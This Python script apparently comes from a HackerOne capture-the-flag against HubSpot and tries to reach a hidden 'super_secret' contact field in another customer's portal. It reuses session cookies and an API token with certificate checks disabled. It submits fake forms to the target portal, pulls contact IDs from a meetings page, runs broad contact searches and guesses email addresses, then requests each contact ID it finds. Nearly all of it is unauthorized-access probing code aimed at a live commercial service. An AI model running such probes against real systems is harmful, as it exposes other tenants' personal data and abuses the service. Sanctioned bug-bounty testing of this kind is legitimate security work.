#!/usr/bin/env python3
"""
Find the REAL contact with super_secret - don't assume ID 1
Try creative ways to discover contacts in portal 46962361
"""

import requests
import json
import os
import urllib3
from dotenv import load_dotenv
import re
import time

urllib3.disable_warnings()
load_dotenv()

SESSION_COOKIES = os.getenv('HUBSPOT_COOKIES')
ACCESS_TOKEN = os.getenv('HUBSPOT_ACCESS_TOKEN')
TARGET_PORTAL = '46962361'

print("="*80)
print("FINDING THE REAL CONTACT - CREATIVE APPROACHES")
print("="*80)

findings = []

session = requests.Session()
for cookie in SESSION_COOKIES.split('; '):
    if '=' in cookie:
        key, value = cookie.split('=', 1)
        session.cookies.set(key, value, domain='.hubspot.com')

# ============================================================================
# 1. SUBMIT FORMS AND RETRIEVE SUBMISSIONS
# ============================================================================

print("\n[1] SUBMITTING FORMS TO CREATE CONTACTS")
print("="*80)

form_ids = [1, 3, 4, 5, 6, 8, 13, 18, 1000]

for form_id in form_ids:
    print(f"\n--- Form {form_id} ---")

    # Submit the form
    submit_url = f'https://api.hsforms.com/submissions/v3/integration/submit/{TARGET_PORTAL}/{form_id}'

    payload = {
        'fields': [
            {'name': 'email', 'value': f'ctf_finder_{form_id}@test.com'},
            {'name': 'firstname', 'value': f'CTF_Test_{form_id}'},
        ]
    }

    try:
        r = requests.post(submit_url, json=payload, verify=False, timeout=10)

        print(f"  Submit status: {r.status_code}")

        if r.status_code == 200:
            print(f"  *** SUBMISSION SUCCESSFUL! ***")

            try:
                data = r.json()
                print(f"  Response: {json.dumps(data, indent=2)[:400]}")

                # Check if we get a contact ID back
                if 'inlineMessage' in data:
                    print(f"  Inline message: {data['inlineMessage'][:200]}")

                if 'redirectUrl' in data:
                    redirect_url = data['redirectUrl']
                    print(f"  Redirect URL: {redirect_url}")

                    # Visit the redirect to see if it shows contact data
                    r2 = session.get(redirect_url, verify=False, timeout=10)

                    if r2.status_code == 200:
                        if 'firstname' in r2.text.lower() or 'super_secret' in r2.text.lower():
                            print(f"  *** REDIRECT PAGE HAS CONTACT DATA! ***")

                            with open(f'findings/form_{form_id}_redirect.html', 'w') as f:
                                f.write(r2.text)

                # Look for contact ID or VID in response
                contact_id_patterns = [
                    r'"contactId":\s*"?(\d+)"?',
                    r'"vid":\s*"?(\d+)"?',
                    r'"hs_object_id":\s*"?(\d+)"?',
                ]

                response_str = json.dumps(data)

                for pattern in contact_id_patterns:
                    matches = re.findall(pattern, response_str)
                    if matches:
                        print(f"  Found contact IDs: {matches}")

                        # Try to retrieve this contact
                        for contact_id in matches[:3]:
                            print(f"\n  Trying to fetch contact {contact_id}...")

                            fetch_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?properties=firstname,super_secret,email'

                            r3 = session.get(fetch_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=5)

                            print(f"    Status: {r3.status_code}")

                            if r3.status_code == 200:
                                print(f"    *** CONTACT ACCESSIBLE! ***")

                                try:
                                    contact_data = r3.json()
                                    print(f"    {json.dumps(contact_data, indent=2)}")

                                    if 'super_secret' in json.dumps(contact_data).lower():
                                        print(f"\n    *** CTF FLAG FOUND! ***")
                                        findings.append({'form_id': form_id, 'contact_id': contact_id, 'data': contact_data})
                                except:
                                    pass
            except:
                print(f"  Response (text): {r.text[:200]}")

        time.sleep(0.5)  # Be nice to the API
    except:
        pass

# ============================================================================
# 2. CHECK MEETINGS PAGE FOR CONTACT DATA
# ============================================================================

print("\n" + "="*80)
print("[2] EXTRACTING CONTACTS FROM MEETINGS PAGE")
print("="*80)

meeting_url = 'https://meetings.hubspot.com/nicksec'

try:
    r = session.get(meeting_url, verify=False, timeout=10)

    if r.status_code == 200:
        print(f"Status: {r.status_code}")
        print(f"Size: {len(r.text)} bytes")

        # Save for analysis
        with open('findings/meetings_page_deep.html', 'w') as f:
            f.write(r.text)

        # Look for embedded contact data or contact IDs
        contact_patterns = [
            r'"contactId":\s*"?(\d+)"?',
            r'"vid":\s*"?(\d+)"?',
            r'"hs_object_id":\s*"?(\d+)"?',
            r'contact[/:](\d+)',
        ]

        all_contact_ids = set()

        for pattern in contact_patterns:
            matches = re.findall(pattern, r.text)
            all_contact_ids.update(matches)

        if all_contact_ids:
            print(f"\nFound {len(all_contact_ids)} potential contact IDs in meetings page:")

            for contact_id in sorted(all_contact_ids)[:20]:
                print(f"  {contact_id}")

                # Try to fetch each one
                fetch_url = f'https://api.hubapi.com/crm/v3/objects/contacts/{contact_id}?properties=firstname,super_secret,email'

                try:
                    r2 = session.get(fetch_url, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=5)

                    if r2.status_code == 200:
                        print(f"    *** ACCESSIBLE! ***")

                        try:
                            data = r2.json()
                            print(f"    {json.dumps(data, indent=2)[:300]}")

                            if 'super_secret' in json.dumps(data).lower():
                                print(f"    *** CTF FLAG FOUND! ***")
                                findings.append({'source': 'meetings', 'contact_id': contact_id, 'data': data})
                        except:
                            pass
                except:
                    pass

                time.sleep(0.2)
except:
    pass

# ============================================================================
# 3. SEARCH FOR CONTACTS WITH COMMON PROPERTIES
# ============================================================================

print("\n" + "="*80)
print("[3] SEARCHING FOR ANY CONTACTS IN TARGET PORTAL")
print("="*80)

search_url = 'https://api.hubapi.com/crm/v3/objects/contacts/search'

# Try different search filters
search_filters = [
    # Any contact with email
    {
        'filterGroups': [{'filters': [{'propertyName': 'email', 'operator': 'HAS_PROPERTY'}]}],
        'properties': ['firstname', 'super_secret', 'email', 'hs_object_id'],
        'limit': 100
    },
    # Any contact created recently
    {
        'filterGroups': [{'filters': [{'propertyName': 'createdate', 'operator': 'GTE', 'value': '2020-01-01'}]}],
        'properties': ['firstname', 'super_secret', 'email', 'hs_object_id'],
        'limit': 100
    },
    # Any contact (no filters)
    {
        'filterGroups': [],
        'properties': ['firstname', 'super_secret', 'email', 'hs_object_id'],
        'limit': 100
    },
]

for i, payload in enumerate(search_filters, 1):
    print(f"\n  Search {i}:")

    try:
        # WITHOUT portalId - uses token's portal
        r = requests.post(search_url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        if r.status_code == 200:
            data = r.json()
            total = data.get('total', 0)

            print(f"    Total contacts: {total}")

            if total > 0:
                print(f"    Results:")

                for result in data.get('results', [])[:10]:
                    contact_id = result.get('id')
                    props = result.get('properties', {})

                    print(f"\n      Contact {contact_id}:")
                    print(f"        Email: {props.get('email', 'N/A')}")
                    print(f"        Firstname: {props.get('firstname', 'N/A')}")

                    # Check which portal
                    if 'url' in result:
                        portal_match = re.search(r'/contacts/(\d+)/', result['url'])
                        if portal_match:
                            portal_id = portal_match.group(1)
                            print(f"        Portal: {portal_id}")

                            if portal_id == TARGET_PORTAL:
                                print(f"        *** FROM TARGET PORTAL! ***")

                    if 'super_secret' in props:
                        print(f"        Super_secret: {props.get('super_secret', 'N/A')}")

                        if portal_id == TARGET_PORTAL:
                            print(f"\n        *** CTF FLAG FOUND! ***")
                            findings.append({'source': 'search', 'contact_id': contact_id, 'data': result})
    except:
        pass

# ============================================================================
# 4. TRY TO ACCESS CONTACTS VIA EMAIL ADDRESS
# ============================================================================

print("\n" + "="*80)
print("[4] SEARCHING BY EMAIL ADDRESSES")
print("="*80)

# Try common email patterns for the target portal
email_patterns = [
    f'contact@portal{TARGET_PORTAL}.com',
    f'test@{TARGET_PORTAL}.com',
    f'admin@{TARGET_PORTAL}.com',
    'nicksec@wearehackerone.com',  # Our session email
    'test@hackerone.com',
    'ctf@hackerone.com',
]

for email in email_patterns:
    print(f"\n  Searching for: {email}")

    payload = {
        'filterGroups': [{
            'filters': [{
                'propertyName': 'email',
                'operator': 'EQ',
                'value': email
            }]
        }],
        'properties': ['firstname', 'super_secret', 'email', 'hs_object_id'],
        'limit': 10
    }

    try:
        r = requests.post(search_url, json=payload, headers={'Authorization': f'Bearer {ACCESS_TOKEN}'}, verify=False, timeout=10)

        if r.status_code == 200:
            data = r.json()

            if data.get('total', 0) > 0:
                print(f"    *** FOUND! ***")

                for result in data.get('results', []):
                    print(f"    {json.dumps(result, indent=2)[:400]}")

                    if 'super_secret' in json.dumps(result).lower():
                        print(f"    *** CTF FLAG FOUND! ***")
                        findings.append({'source': 'email_search', 'email': email, 'data': result})
    except:
        pass

    time.sleep(0.2)

print("\n" + "="*80)
print("CREATIVE CONTACT SEARCH COMPLETE")
print("="*80)

if findings:
    print(f"\n*** FOUND {len(findings)} CONTACTS WITH DATA! ***\n")

    with open('/home/user/Hub/findings/REAL_CONTACTS_FOUND.json', 'w') as f:
        json.dump(findings, f, indent=2)

    for finding in findings:
        print(f"\n{json.dumps(finding, indent=2)[:800]}")
else:
    print("\nNo contacts found with super_secret in target portal.")
    print("Moving on to look for other vulnerabilities...")
